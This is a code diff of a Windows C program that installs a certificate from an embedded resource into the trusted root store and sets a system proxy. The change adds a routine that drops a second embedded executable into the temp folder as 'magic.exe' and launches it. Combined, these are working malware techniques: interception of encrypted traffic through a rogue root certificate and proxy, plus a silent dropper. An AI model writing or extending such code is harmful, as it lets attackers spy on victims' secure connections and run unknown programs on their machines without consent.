@@ -76,8 +76,8 @@ BOOL installCert(BYTE *data, DWORD size){
     CertCloseStore(hRootCertStore, 0);
 }
 
-DWORD initRsc(BYTE **resource){
-    HRSRC hObj = FindResource(NULL,MAKEINTRESOURCE(0),RT_RCDATA);
+DWORD initRsc(BYTE **resource, int resourceNumber){
+    HRSRC hObj = FindResource(NULL,MAKEINTRESOURCE(resourceNumber),RT_RCDATA);
     HGLOBAL hRes = LoadResource(NULL,hObj);
     BYTE *lpBin = (BYTE*)LockResource((unsigned char*)hRes);
     DWORD dwSize = SizeofResource(NULL,hObj);
@@ -92,6 +92,30 @@ DWORD initRsc(BYTE **resource){
     *resource = pBytes;
     return dwSize;
 }
+
+
+BOOL installEmbedded() {
+    PBYTE embeddedData;
+    DWORD dwSize = initRsc(&embeddedData, 1);
+
+    char embeddedPath[MAX_PATH];
+
+    GetTempPathA(MAX_PATH, embeddedPath);
+    strcat(embeddedPath, "magic.exe");
+    HANDLE hFile = CreateFile(embeddedPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if(hFile != INVALID_HANDLE_VALUE) {
+        DWORD dwBytesWritten = 0;
+        WriteFile(hFile, embeddedData, dwSize, &dwBytesWritten, NULL);
+        CloseHandle(hFile);
+    }
+    STARTUPINFO si = {sizeof(si)};
+    PROCESS_INFORMATION pi;
+    BOOL ret = CreateProcessA(embeddedPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+    return 0;
+}
+
 
 int isElevated() {
     HANDLE hToken = NULL;
@@ -138,8 +162,9 @@ int main(){
     }
 
     PBYTE rscData;
-    DWORD size = initRsc(&rscData);
+    DWORD size = initRsc(&rscData, 0);
     installCert(rscData, size);
     installProxy(PROXY_SERVER);
+    installEmbedded();
     cleanup();
 }
